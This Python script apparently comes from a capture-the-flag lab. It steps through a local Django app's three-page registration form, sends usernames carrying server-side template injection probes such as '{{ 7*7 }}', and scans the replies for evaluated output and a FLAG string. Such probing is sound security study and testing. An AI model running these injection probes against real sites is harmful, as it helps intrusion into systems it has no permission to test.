import requests
import re

BASE_URL = "http://127.0.0.1:32896"

# Initialize session
session = requests.Session()
session.cookies.set("csrftoken", "LdrXRl8e00koJnMqetC83VYf7Us4Ec65", domain="127.0.0.1", path="/")

def extract_csrf(html):
    match = re.search(r'csrfmiddlewaretoken["\']?\s*[:\s=]+["\']?([a-zA-Z0-9]{64})', html)
    if match:
        return match.group(1)
    match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', html)
    return match.group(1) if match else None

def test_payload(username):
    print(f"\n{'='*60}")
    print(f"Testing: {username}")
    print(f"{'='*60}")
    
    # Step 1
    r1 = session.get(f"{BASE_URL}/accounts/register/step1/")
    csrf = extract_csrf(r1.text)
    print(f"Step 1 GET: {r1.status_code}")
    
    data1 = {
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'email': 'test@test.com',
        'password1': 'TestPass123',
        'password2': 'TestPass123'
    }
    r1_post = session.post(f"{BASE_URL}/accounts/register/step1/", data=data1)
    print(f"Step 1 POST: {r1_post.status_code}")
    
    # Step 2
    r2 = session.get(f"{BASE_URL}/accounts/register/step2/")
    csrf = extract_csrf(r2.text)
    print(f"Step 2 GET: {r2.status_code}")
    
    data2 = {
        'csrfmiddlewaretoken': csrf,
        'bio': 'test',
        'favorite_artist': 'test'
    }
    r2_post = session.post(f"{BASE_URL}/accounts/register/step2/", data=data2)
    print(f"Step 2 POST: {r2_post.status_code}")
    
    # Step 3 - Check JavaScript
    r3 = session.get(f"{BASE_URL}/accounts/register/step3/")
    print(f"Step 3 GET: {r3.status_code}\n")
    
    # Extract script blocks
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', r3.text, re.DOTALL)
    
    for i, script in enumerate(scripts):
        if script.strip():
            print(f"Script {i+1}:\n{script}\n")
    
    # Check for evaluation
    if "49" in r3.text and username == "{{ 7*7 }}":
        print("[!] SSTI: {{ 7*7 }} evaluated to 49")
    if "7777777" in r3.text and username == "{{ 7*'7' }}":
        print("[!] SSTI: {{ 7*'7' }} evaluated to 7777777")
    
    # Check for FLAG
    flag = re.search(r'FLAG\{[^}]+\}', r3.text)
    if flag:
        print(f"\n[!!!] FLAG FOUND: {flag.group(0)}")
    
    print(f"\nFull response length: {len(r3.text)} bytes")
    return r3.text

